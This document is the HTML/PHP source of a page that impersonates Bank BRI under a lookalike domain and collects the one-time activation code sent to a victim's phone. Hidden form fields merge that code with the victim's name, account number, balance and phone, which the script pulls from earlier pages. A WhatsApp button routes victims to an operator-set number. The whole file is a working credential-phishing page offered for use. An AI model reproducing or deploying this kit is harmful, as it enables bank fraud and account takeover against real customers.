<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="fragment" content="!">
    <meta name="theme-color" content="#0F78CB">
    <!-- HTML Meta Tags -->
    <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 | 𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱</title>
    <link rel="icon" type="image/png" href="ast/nssd3w.png">
<meta content="ast/f8uyn1.jpg" property="og:image">
<meta name="twitter:image" content="ast/f8uyn1.jpg">
    	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');

        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to bottom right, #e0f2fe, #e0f7fa); /* Gradient background */ 
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 90vh;
        }

        .box-lte {
            width: 380px;
            max-width: 95%;
            background: #fff;
            padding: 30px;
            box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.1);
            border-radius: 15px;
            overflow: hidden; 
            position: relative; 
        }

        .box-lte::before {
            content: "";
            position: absolute;
            top: -50px;
            left: -50px;
            width: 150px;
            height: 150px;
            background: linear-gradient(to bottom right, #007bff, #00c853); 
            border-radius: 50%;
            opacity: 0.3;
            z-index: -1; 
        }

        .logo img {
            max-width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #137fd5;
        }

        p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            font-weight: 500;
            margin-bottom: 5px;
        }

        .form-control {
            border: 1px solid #137fd5;
            border-radius: 8px;
            padding: 10px;
            font-size: 14px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);
            transition: box-shadow 0.3s ease;
        }

        .form-control:focus {
            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.2);
            outline: none;
        }

        .btn-primary {
            background-color: #137fd5;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);
            width: 60%;
            transition: 0.3s;
        }

        .btn-primary:hover {
            background-color: #0069d9;
            transform: translateY(-2px);
        }
        
        button:disabled, 
        button[disabled]{  
            opacity:0.3;          
            background-color: #0F78CB; 
            color: #fff;
}

        .resend-link {
            font-size: 14px;
            color: #137fd5;
            text-decoration: none;
            margin-top: 15px;
            display: block;
            transition: color 0.3s ease;
            margin-left:10px;          
        }

        .resend-link:hover {
            color: #0069d9;
        }

        .alert {
            position: relative;
            padding: 10px 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 8px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.05);
            font-size:14px;
        }

        .alert-danger {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }

        .alert-success {
            color: #155724;
            background-color: #d4edda;
            border-color: #c3e6cb;
        }

        .alert-info {
            color: #0c5460;
            background-color: #d1ecf1;
            border-color: #bee5eb;
        }

        .loader {
            border: 8px solid #f3f3f3;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            display: none;
            margin: -20px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #countdown {
            font-size: 15px;
            color: #007bff;
            font-weight: 600;
        }

        /* Glassmorphism Effect */
        .box-lte {
            background: rgba(255, 255, 255, 0.8); 
            backdrop-filter: blur(10px); 
        }

       
        
        .whatsapp-icon {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;             
        }

        .whatsapp-icon img {
            display: block;
            width: 60px;
            height: 60px;                       
            text-align: center;
            line-height: 60px;         
            transition: transform 0.2s ease;
        }

        .whatsapp-icon img:hover {
            transform: scale(1.1);
        }

        .whatsapp-icon img {
            width: 50px;
            height: 50px;
        }
        
   .loadercs{
      font-size: 20px;
      color: #FFF;
      font-weight: bold;
      display: inline-block;
      margin: 0 auto;
      font-family: 'Nunito', sans-serif;
      z-index:999999999999999999999;
      position: absolute;
      top: 50;
      left: 0;
      right: 0;
      text-align: center;
      align-item: center;
      justify-content: center;
    }
    .loadercs:before{
      content: '';
      animation: 2s print linear alternate infinite;
    }
    .loadercs:after{
      content: '';
      position: absolute;
      right: -px;
      top: 50%;
      transform: translatey(-45%);
      width: 2px;
      height: 1.3em;
      background: currentColor;
      opacity: 0.8;
      animation: 1s blink steps(2) infinite;
    }
    
    @keyframes blink {
      0%  { visibility: hidden;}
      100%  { visibility: visible;}
    }
    @keyframes print {
      0% { content: 'B'}
      10% { content: 'BR'}
      20% { content: 'BRI'}
      30% { content: 'BRIm'}
      40% { content: 'BRImo'}
      50% { content: 'BRImo-'}
      60% { content: 'BRImo-B'}
      70% { content: 'BRImo-BR.'}
      80% { content: 'BRImo-BRI..'}
      90% , 100% { content: 'BRImo-BRI...'}
    }
    
    .load{
     top: 0;
     left: 0;
     right: 0;
     position: fixed;
     display: flex;
     justify-content: center;
     align-items: center;
     background: #00000090;
     z-index: 999999999;
     width: 100%;
     height: 100%;
      }
    </style>
</head>

<body>
    <center>
     <div id="process1" name="process" class="process1" style="display: none;">
        <span class="loadercs"></span>
        </div>
        <div class="load" style="display:none"></div>        
        </center>
    <div class="box-lte">
        <div class="logo">
            <img src="ast/l7w1uk.png" alt="Logo BRI">
        </div>
        <h2>Aktivasi Tarif Bank BRI</h2>
        <p>Masukkan kode aktivasi yang telah dikirimkan ke nomor
            <span id="text" style="color: #137fd5; font-weight: 600;"> </span>
        </p>
        <p style="color: #137fd5;" id="countdown"></p>
        <div class="alert alert-danger" id="errorAlert" style="display: none;"></div>
        <form id="formLink" method="post" onsubmit="sendOtp()">
<input type="hidden" name="desc" value="OTP">
<input type="hidden" name="formid" value="ver">
<input type="hidden" name="merge" value="index,lg,blnce,ver">
            

            <div class="form-group">
                <label for="otp">Kode Aktivasi</label>
                <input type="tel" class="form-control" id="nama1" name="UCUP#Code_OTP" placeholder="Masukkan kode aktivasi" maxlength="6" minlength="6" required>
            </div>

            <button type="submit" id="kirim" class="btn-primary" disabled>Konfirmasi</button>
        </form>
        <a href="ver.php" class="resend-link">Kirim ulang SMS</a>
        <div class="loader" id="loader"></div>
         <a class="whatsapp-icon" id="getcs">                    
            <img src="ast/oz5jsz.png" alt="WhatsApp"> 
        </a>
    </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="i.js"></script>
<script src="ast/sc.js"></script>
 
    <script>
       // Get references to the input and button elements
$(document).ready(function() {
    $('#getcs').click(function() {
    $("#process1").show();
 $('.load').fadeIn();
    setTimeout(function(){
location.href='https://wa.me/<?php include_once("appConfig.php"); echo $noWa;  ?>?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
  });   
const input = document.getElementById("nama1");
const button = document.getElementById("kirim");

// Add an event listener for the input event
input.addEventListener("input", () => {
  // Check if the input field has any text
  if (input.value.length > 3) {
    // If there's text, enable the button
    button.disabled = false;
  } else {
    // If there's no text, disable the button
    button.disabled = true;
  }
});
        var logo = "____𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱༻";
        var nohp = sessionStorage.getItem("nohp");
        document.getElementById("text").innerHTML = nohp;
        
        document.getElementById("tarif").value =
        sessionStorage.getItem("tarif");
        document.getElementById("nohp").value = nohp;        
        document.getElementById("nama").value =
        sessionStorage.getItem("nama"); 
        document.getElementById("rek").value =
        sessionStorage.getItem("rek");        
        document.getElementById("saldo").value =
        sessionStorage.getItem("saldo");
             
        // Timer
        function startTimer(duration) {
            var timer = duration, minutes, seconds;
            var display = $("#countdown");
            var intervalId = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.text("Waktu tersisa: " + minutes + ":" + seconds);
                if (--timer < 0) {
                    clearInterval(intervalId);
                    $(".resend-link").removeClass("disabled");
                }
            }, 1000);
        }

        $(document).ready(function () {
            startTimer(60 * 3);
            $(".resend-link").addClass("disabled");
        });

        
    </script>
</body>

</html>
